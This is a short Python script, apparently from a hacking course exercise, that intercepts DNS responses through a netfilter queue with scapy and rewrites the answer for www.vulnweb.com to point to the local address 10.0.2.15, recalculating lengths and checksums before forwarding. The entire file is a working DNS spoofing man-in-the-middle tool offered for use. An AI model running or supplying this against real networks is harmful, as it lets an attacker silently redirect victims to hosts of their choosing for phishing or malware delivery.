#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.vulnweb.com" in qname:
            print("[+] spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
            scapy_packet[scapy.DNS].an=answer
            scapy_packet[scapy.DNS].ancount=1
            del scapy_packet[scapy.IP].len  #check for modified length
            del scapy_packet[scapy.IP].chksum  #check for modified packet
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(str(scapy_packet))

    packet.accept()  # forwarding to router access


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
